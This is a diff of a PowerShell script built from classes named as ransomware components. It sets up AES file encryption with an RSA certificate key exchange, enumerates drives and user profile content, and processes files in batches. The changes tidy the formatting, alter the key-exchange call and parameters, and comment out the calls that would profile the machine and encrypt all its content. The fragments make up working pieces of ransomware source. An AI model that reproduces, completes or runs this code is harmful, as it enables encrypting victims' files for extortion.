@@ -4,11 +4,11 @@
 
 Class RansomwareFileItem
 {
-    [String]             $Mode
-    [DateTime]           $Date
-    [Int32]             $Depth
-    [String]             $Name
-    [String]         $FullName
+    [String]       $Mode
+    [DateTime]     $Date
+    [Int32]       $Depth
+    [String]       $Name
+    [String]   $FullName
     RansomwareFileItem([String]$Fullname)
     {
         If (![System.IO.File]::Exists($Fullname))
@@ -85,7 +85,7 @@ Class RansomwareProvider
         $This.Certificate  = $This.GetCertificate($Certificate)
         $This.AesProvider  = $This.GetAesProvider()
         $This.KeyFormatter = $This.GetKeyExchangeFormatter()
-        $This.KeyExchange  = $This.KeyFormatter.CreateKeyExchange($This.AESProvider.Key,$This.Name)
+        $This.KeyExchange  = $This.KeyFormatter.CreateKeyExchange($This.AesProvider.Key,$This.AesProvider.GetType())
         $This.KeyLength    = $This.KeyExchange.Length
         $This.Key          = [System.BitConverter]::GetBytes($This.KeyLength)
         $This.IVLength     = $This.AesProvider.IV.Length
@@ -114,9 +114,9 @@ Class RansomwareProvider
     {
         Return [System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter]::New($This.Certificate.PublicKey.Key)
     }
-    [Object] RansomwareCryptoItem([String]$Source,[String]$Target)
+    [Object] RansomwareCryptoItem([UInt32]$Index,[String]$Source,[String]$Target)
     {
-        Return [RansomwareCryptoItem]::New($Source,$Target)
+        Return [RansomwareCryptoItem]::New($Index,$Source,$Target)
     }
     ProcessFile([Object]$File)
     {        
@@ -242,7 +242,7 @@ Class RansomwareDriveItem
 
 Class RansomwareDriveList
 {
-    [Object]     $Output
+    [Object] $Output
     RansomwareDriveList()
     {
         $This.Refresh()
@@ -278,8 +278,8 @@ Class RansomwareDriveList
 
 Class RansomwareProgress
 {
-    [UInt32] $Index
-    [UInt32] $Rank
+    [UInt32]  $Index
+    [UInt32]   $Rank
     [String] $Status
     RansomwareProgress([UInt32]$Index,[UInt32]$Step)
     {
@@ -328,8 +328,8 @@ Class RansomwareHostController
         $This.Provider    = $This.RansomwareProvider()
         $This.Drive       = $This.RansomwareDriveList()
 
-        $This.GetProfile()
-        $This.GetContent()
+        # $This.GetProfile()
+        # $This.GetContent()
     }
     [Object] GetCertificate()
     {
@@ -419,8 +419,6 @@ Class RansomwareHostController
         {
             $File = $This.Content[$X]
 
-            [Console]::WriteLine($File.Fullname)
-
             If ($X -in $Slot.Rank)
             {
                 $C ++
@@ -439,4 +437,7 @@ Class RansomwareHostController
 }
 
 $Ctrl = [RansomwareHostController]::New()
-$Ctrl.ProcessAll()
+
+# $Ctrl.GetProfile()
+# $Ctrl.GetContent()
+# $Ctrl.ProcessAll()
